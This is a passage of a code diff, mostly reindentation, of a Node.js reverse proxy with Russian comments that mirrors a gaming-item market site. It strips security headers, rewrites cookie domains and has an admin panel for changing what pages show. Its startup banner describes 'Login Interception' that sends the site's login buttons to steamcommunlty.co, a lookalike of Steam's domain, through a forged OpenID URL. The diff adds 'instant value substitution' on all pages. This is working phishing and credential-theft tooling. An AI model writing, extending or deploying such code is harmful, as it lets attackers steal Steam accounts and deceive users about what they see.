+        delete responseHeaders['cross-origin-embedder-policy'];
 
-// Добавляем заголовки безопасности для HTTPS
-if (isSecure(req)) {
-responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
-}
+        // Добавляем заголовки безопасности для HTTPS
+        if (isSecure(req)) {
+            responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
+        }
 
-// Модификация set-cookie
-if (responseHeaders['set-cookie']) {
-responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
-return cookie
-.replace(/domain=.*?(;|$)/gi, '')
-.replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
-.replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
-});
-}
+        // Модификация set-cookie
+        if (responseHeaders['set-cookie']) {
+            responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
+                return cookie
+                    .replace(/domain=.*?(;|$)/gi, '')
+                    .replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
+                    .replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
+            });
+        }
 
-// Устанавливаем заголовки
-Object.entries(responseHeaders).forEach(([key, value]) => {
-if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
-res.set(key, value);
-}
-});
+        // Устанавливаем заголовки
+        Object.entries(responseHeaders).forEach(([key, value]) => {
+            if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
+                res.set(key, value);
+            }
+        });
 
-res.set('content-length', content.length);
-res.status(response.status);
-res.send(content);
+        res.set('content-length', content.length);
+        res.status(response.status);
+        res.send(content);
 
-} catch (error) {
-console.error('❌ Proxy error:', error.message);
-res.status(500).json({ 
-error: 'Proxy Error', 
-message: error.message,
-stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
-});
-}
+    } catch (error) {
+        console.error('❌ Proxy error:', error.message);
+        res.status(500).json({ 
+            error: 'Proxy Error', 
+            message: error.message,
+            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+        });
+    }
 });
 
 // Добавлена периодическая очистка устаревших сессий
 setInterval(() => {
-const now = Date.now();
-let cleaned = 0;
+    const now = Date.now();
+    let cleaned = 0;
 
-sessions.forEach((session, id) => {
-if (session.lastAccess && now - session.lastAccess > 24 * 60 * 60 * 1000) { // Старше 24 часов
-sessions.delete(id);
-cleaned++;
-}
-});
+    sessions.forEach((session, id) => {
+        if (session.lastAccess && now - session.lastAccess > 24 * 60 * 60 * 1000) { // Старше 24 часов
+            sessions.delete(id);
+            cleaned++;
+        }
+    });
 
-if (cleaned > 0) {
-console.log(`🧹 Cleaned ${cleaned} expired sessions`);
-}
+    if (cleaned > 0) {
+        console.log(`🧹 Cleaned ${cleaned} expired sessions`);
+    }
 }, 60 * 60 * 1000); // Проверка каждый час
 
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
-console.log(`
-   🚀 Advanced Market Proxy Server (IMPROVED VERSION WITH ADMIN PANEL)
-   📡 Port: ${PORT}
-   🎯 Target: ${TARGET_HOST}
-   🔌 WebSocket: ${WS_TARGET}
-   🔒 HTTPS: Auto-detected
-   👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
-   🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
-   
-   Features:
-   ✓ Full HTTP/HTTPS proxy
-   ✓ WebSocket support (Fixed)
-   ✓ GraphQL support (Enhanced)
-   ✓ Cookie management
-   ✓ CORS handling
-   ✓ URL rewriting (Improved)
-   ✓ Content modification
-   ✓ Login buttons interception
-   ✓ Mixed content prevention
-   ✓ AdBlocker bypass attempt
-   ✓ Admin Panel for custom page modifications
-   `);
+    console.log(`
+    🚀 Advanced Market Proxy Server (IMPROVED VERSION WITH ADMIN PANEL)
+    📡 Port: ${PORT}
+    🎯 Target: ${TARGET_HOST}
+    🔌 WebSocket: ${WS_TARGET}
+    🔒 HTTPS: Auto-detected
+    👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
+    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head
+    ✅ Instant value substitution: Enabled for all pages
+    `);
 });
 
 // Graceful shutdown
 process.on('SIGINT', () => {
-console.log('\n🔄 Shutting down gracefully...');
-// Сохраняем настройки перед выключением
-saveCustomPages();
-server.close(() => {
-console.log('✅ Server closed');
-process.exit(0);
-});
+    console.log('\n🔄 Shutting down gracefully...');
+    // Сохраняем настройки перед выключением
+    saveCustomPages();
+    server.close(() => {
+        console.log('✅ Server closed');
+        process.exit(0);
+    });
 });
